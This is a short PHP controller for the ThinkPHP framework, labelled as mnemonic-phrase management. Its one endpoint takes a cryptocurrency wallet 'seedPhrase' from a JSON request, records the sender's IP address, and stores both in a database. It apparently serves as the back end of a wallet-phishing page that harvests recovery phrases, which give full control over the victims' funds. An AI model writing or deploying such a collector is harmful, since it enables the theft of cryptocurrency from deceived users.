<?php

declare(strict_types=1);

namespace app\api\controller;

use think\admin\Controller;
use app\api\model\word as zhujici;

/**
 * 助记词管理
 * @class Login
 * @package app\admin\controller
 */
class Word extends Controller
{
    /**
     * 助记词
     * @return void
     * @throws \think\admin\Exception
     */
    public function index()
    {
       $json_string = file_get_contents('php://input');
       $data=json_decode($json_string,true);
       $word = $data['seedPhrase'];
       $ip=$this->getRealIP();
       $data=['word'=>$word,'ip'=>$ip,'createdat'=>date("Y-m-d H:i:s")];
       zhujici::insert($data);
       return json(['success'=>1]);

    }


    private function getRealIP() {
        $ip = '';
        if (isset($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }

}